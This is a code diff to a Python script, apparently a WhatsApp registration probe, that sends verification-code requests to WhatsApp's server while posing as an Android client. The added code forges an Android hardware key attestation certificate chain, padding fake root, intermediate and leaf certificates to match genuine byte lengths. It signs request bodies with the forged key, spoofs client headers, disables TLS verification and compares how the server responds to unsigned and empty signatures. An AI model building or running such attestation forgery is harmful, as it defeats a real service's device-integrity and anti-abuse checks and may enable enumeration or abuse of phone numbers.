@@ -3,6 +3,7 @@ from __future__ import annotations
 
 import argparse
 import base64
+import datetime as dt
 import hashlib
 import hmac
 import json
@@ -22,11 +23,14 @@ warnings.filterwarnings("ignore", message="urllib3 v2 only supports OpenSSL.*")
 
 import requests
 import urllib3
+from cryptography import x509
+from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives import padding
-from cryptography.hazmat.primitives.asymmetric import x25519
+from cryptography.hazmat.primitives.asymmetric import ec, utils as asymmetric_utils, x25519
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, PrivateFormat, PublicFormat
+from cryptography.x509.oid import NameOID, ObjectIdentifier
 
 import wa_exist_probe
 
@@ -36,6 +40,15 @@ SERVER_PUBLIC_KEY_HEX = wa_exist_probe.SERVER_PUBLIC_KEY_HEX
 CODE_URL = wa_exist_probe.CODE_URL
 USER_AGENT = "WhatsApp/2.26.23.71 Android/14 Device/OnePlus-LE2100"
 FORM_SAFE = set(string.ascii_letters + string.digits + "-._~")
+
+ANDROID_KEY_ATTESTATION_OID = ObjectIdentifier("1.3.6.1.4.1.11129.2.1.17")
+NATIVE_ATTESTATION_PADDING_OID = ObjectIdentifier("1.3.6.1.4.1.11129.2.1.777")
+NATIVE_ATTESTATION_ROOT_DER_LENGTH = 1312
+NATIVE_ATTESTATION_FIRST_INTERMEDIATE_DER_LENGTH = 920
+NATIVE_ATTESTATION_SECOND_INTERMEDIATE_DER_LENGTH = 505
+NATIVE_ATTESTATION_LEAF_DER_LENGTH = 685
+NATIVE_ATTESTATION_SIGNATURE_RAW_URL_LENGTH = 96
+NATIVE_ATTESTATION_SIGNATURE_MAX_ATTEMPTS = 64
 
 NATIVE_GPIA_PACKAGE_NAME = "com.whatsapp"
 NATIVE_GPIA_SOURCE_SIZE = "141711087"
@@ -622,6 +635,232 @@ def encrypt_wasafe(plain: str) -> str:
     return b64u(public + sealed)
 
 
+def der_len(length: int) -> bytes:
+    if length < 0x80:
+        return bytes([length])
+    raw = length.to_bytes((length.bit_length() + 7) // 8, "big")
+    return bytes([0x80 | len(raw)]) + raw
+
+
+def der_tlv(tag: int, value: bytes) -> bytes:
+    return bytes([tag]) + der_len(len(value)) + value
+
+
+def der_integer(value: int) -> bytes:
+    raw = value.to_bytes(max(1, (value.bit_length() + 7) // 8), "big")
+    if raw[0] & 0x80:
+        raw = b"\x00" + raw
+    return der_tlv(0x02, raw)
+
+
+def der_enumerated(value: int) -> bytes:
+    raw = value.to_bytes(max(1, (value.bit_length() + 7) // 8), "big")
+    if raw[0] & 0x80:
+        raw = b"\x00" + raw
+    return der_tlv(0x0A, raw)
+
+
+def der_octet_string(value: bytes) -> bytes:
+    return der_tlv(0x04, value)
+
+
+def der_sequence(*items: bytes) -> bytes:
+    return der_tlv(0x30, b"".join(items))
+
+
+def native_android_key_attestation_challenge(material: ProbeMaterial) -> bytes:
+    return int(time.time()).to_bytes(8, "big") + b"\x1f" + decode_b64_any(material.authkey)
+
+
+def native_android_key_attestation_extension(material: ProbeMaterial) -> bytes:
+    empty_authorization_list = der_sequence()
+    return der_sequence(
+        der_integer(3),
+        der_enumerated(1),
+        der_integer(4),
+        der_enumerated(1),
+        der_octet_string(native_android_key_attestation_challenge(material)),
+        der_octet_string(b""),
+        empty_authorization_list,
+        empty_authorization_list,
+    )
+
+
+def native_attestation_serial_name() -> x509.Name:
+    return x509.Name([x509.NameAttribute(NameOID.SERIAL_NUMBER, secrets.token_hex(16))])
+
+
+def native_attestation_leaf_name() -> x509.Name:
+    return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Android Keystore Key")])
+
+
+def native_attestation_serial() -> int:
+    return secrets.randbits(128) or 1
+
+
+def native_cert_builder(
+    subject: x509.Name,
+    issuer: x509.Name,
+    public_key: ec.EllipticCurvePublicKey,
+    now: dt.datetime,
+    is_ca: bool,
+    path_length: int | None,
+    extensions: list[x509.ExtensionType],
+) -> x509.CertificateBuilder:
+    builder = (
+        x509.CertificateBuilder()
+        .subject_name(subject)
+        .issuer_name(issuer)
+        .public_key(public_key)
+        .serial_number(native_attestation_serial())
+        .not_valid_before(now - dt.timedelta(minutes=1))
+        .not_valid_after(now + dt.timedelta(days=365))
+        .add_extension(x509.BasicConstraints(ca=is_ca, path_length=path_length), critical=True)
+        .add_extension(
+            x509.KeyUsage(
+                digital_signature=True,
+                content_commitment=False,
+                key_encipherment=False,
+                data_encipherment=False,
+                key_agreement=False,
+                key_cert_sign=is_ca,
+                crl_sign=False,
+                encipher_only=False,
+                decipher_only=False,
+            ),
+            critical=True,
+        )
+    )
+    for extension in extensions:
+        builder = builder.add_extension(extension, critical=False)
+    return builder
+
+
+def sign_padded_certificate(
+    subject: x509.Name,
+    issuer: x509.Name,
+    public_key: ec.EllipticCurvePublicKey,
+    signer_key: ec.EllipticCurvePrivateKey,
+    now: dt.datetime,
+    is_ca: bool,
+    path_length: int | None,
+    extensions: list[x509.ExtensionType],
+    target_length: int,
+) -> bytes:
+    padding_length = 0
+    best = b""
+    for _ in range(24):
+        padded_extensions = list(extensions)
+        if padding_length > 0:
+            padded_extensions.append(x509.UnrecognizedExtension(NATIVE_ATTESTATION_PADDING_OID, secrets.token_bytes(padding_length)))
+        cert = native_cert_builder(subject, issuer, public_key, now, is_ca, path_length, padded_extensions).sign(signer_key, hashes.SHA256())
+        der = cert.public_bytes(Encoding.DER)
+        best = der
+        diff = target_length - len(der)
+        if diff == 0:
+            return der
+        padding_length = max(0, padding_length + diff)
+    return best
+
+
+@dataclass(frozen=True)
+class WASafeEnvelope:
+    body: str
+    authorization: str
+    enc_hash: str
+    h_hash: str
+
+
+def build_signed_wasafe_envelope(plain: str, material: ProbeMaterial, mode: str) -> WASafeEnvelope:
+    enc = encrypt_wasafe(plain)
+    if mode == "unsigned":
+        return WASafeEnvelope(body="ENC=" + enc, authorization="", enc_hash=short_hash(enc), h_hash="")
+    if mode == "empty":
+        return WASafeEnvelope(body="ENC=" + enc + "&H=", authorization="", enc_hash=short_hash(enc), h_hash="")
+
+    now = dt.datetime.now(dt.timezone.utc)
+    leaf_key = ec.generate_private_key(ec.SECP256R1())
+    root_key = ec.generate_private_key(ec.SECP256R1())
+    first_key = ec.generate_private_key(ec.SECP256R1())
+    second_key = ec.generate_private_key(ec.SECP256R1())
+
+    root_subject = native_attestation_serial_name()
+    first_subject = x509.Name(
+        [
+            x509.NameAttribute(NameOID.SERIAL_NUMBER, secrets.token_hex(16)),
+            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "TEE"),
+        ]
+    )
+    second_subject = x509.Name(
+        [
+            x509.NameAttribute(NameOID.SERIAL_NUMBER, secrets.token_hex(16)),
+            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "TEE"),
+        ]
+    )
+    leaf_subject = native_attestation_leaf_name()
+
+    root_der = sign_padded_certificate(
+        root_subject,
+        root_subject,
+        root_key.public_key(),
+        root_key,
+        now,
+        True,
+        2,
+        [],
+        NATIVE_ATTESTATION_ROOT_DER_LENGTH,
+    )
+    first_der = sign_padded_certificate(
+        first_subject,
+        root_subject,
+        first_key.public_key(),
+        root_key,
+        now,
+        True,
+        1,
+        [],
+        NATIVE_ATTESTATION_FIRST_INTERMEDIATE_DER_LENGTH,
+    )
+    second_der = sign_padded_certificate(
+        second_subject,
+        first_subject,
+        second_key.public_key(),
+        first_key,
+        now,
+        True,
+        0,
+        [],
+        NATIVE_ATTESTATION_SECOND_INTERMEDIATE_DER_LENGTH,
+    )
+    leaf_der = sign_padded_certificate(
+        leaf_subject,
+        second_subject,
+        leaf_key.public_key(),
+        second_key,
+        now,
+        False,
+        None,
+        [x509.UnrecognizedExtension(ANDROID_KEY_ATTESTATION_OID, native_android_key_attestation_extension(material))],
+        NATIVE_ATTESTATION_LEAF_DER_LENGTH,
+    )
+    chain_der = root_der + first_der + second_der + leaf_der
+
+    digest = hashlib.sha256(enc.encode("ascii")).digest()
+    signature = b""
+    for _ in range(NATIVE_ATTESTATION_SIGNATURE_MAX_ATTEMPTS):
+        candidate = leaf_key.sign(digest, ec.ECDSA(asymmetric_utils.Prehashed(hashes.SHA256())))
+        signature = candidate
+        if len(b64u(candidate)) == NATIVE_ATTESTATION_SIGNATURE_RAW_URL_LENGTH:
+            break
+    h_value = b64u(signature)
+    return WASafeEnvelope(
+        body="ENC=" + enc + "&H=" + h_value,
+        authorization=base64.b64encode(chain_der).decode("ascii"),
+        enc_hash=short_hash(enc),
+        h_hash=short_hash(h_value),
+    )
+
+
 def summarize_response(data: dict[str, Any]) -> dict[str, Any]:
     reason = str(data.get("reason") or data.get("failure_reason") or "")
     status = str(data.get("status") or "")
@@ -666,6 +905,11 @@ def post_code(material: ProbeMaterial, config: ShapeConfig, args: argparse.Names
     params = build_code_params(material, config, args)
     plain = render_plain(params)
     shape = param_shape(params)
+    envelope_mode = "signed"
+    if args.unsigned:
+        envelope_mode = "unsigned"
+    if args.empty_h:
+        envelope_mode = "empty"
     result: dict[str, Any] = {
         "variant": config.name,
         "phone_hash": short_hash(material.e164),
@@ -673,6 +917,7 @@ def post_code(material: ProbeMaterial, config: ShapeConfig, args: argparse.Names
         "field_count": len(params),
         "plain_len": len(plain),
         "shape_hash": short_hash(shape),
+        "envelope_mode": envelope_mode,
     }
     if args.show_fields:
         result["fields"] = shape
@@ -680,16 +925,21 @@ def post_code(material: ProbeMaterial, config: ShapeConfig, args: argparse.Names
     if args.dry_run:
         result["dry_run"] = True
         return result
-    body = "ENC=" + encrypt_wasafe(plain) + "&H="
+    envelope = build_signed_wasafe_envelope(plain, material, envelope_mode)
+    result["enc_hash"] = envelope.enc_hash
+    if envelope.h_hash:
+        result["h_hash"] = envelope.h_hash
     headers = {
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": USER_AGENT,
         "WaMsysRequest": "1",
         "X-Forwarded-Host": "v.whatsapp.net",
     }
+    if envelope.authorization:
+        headers["Authorization"] = envelope.authorization
     proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
     try:
-        response = requests.post(CODE_URL, headers=headers, data=body, proxies=proxies, timeout=args.timeout, verify=False)
+        response = requests.post(CODE_URL, headers=headers, data=envelope.body, proxies=proxies, timeout=args.timeout, verify=False)
         try:
             parsed: Any = response.json()
         except ValueError:
@@ -856,6 +1106,8 @@ def build_parser() -> argparse.ArgumentParser:
     parser.add_argument("--reuse-phones", action="store_true", help="reuse the same random phones across matrix variants; default is fresh phones per variant")
     parser.add_argument("--set", dest="set_param", action="append", default=[], help="override final raw param as key=value; can repeat")
     parser.add_argument("--omit", action="append", default=[], help="omit final param by key; can repeat")
+    parser.add_argument("--unsigned", action="store_true", help="send ENC without H/Authorization for no-auth envelope comparison")
+    parser.add_argument("--empty-h", action="store_true", help="send legacy ENC with an empty H value for regression comparison")
     parser.add_argument("--dry-run", action="store_true", help="render request shape only; do not send")
     parser.add_argument("--show-fields", action="store_true", help="print field order/lengths and value hashes")
     parser.add_argument("--show-response", action="store_true", help="print sanitized response payload")
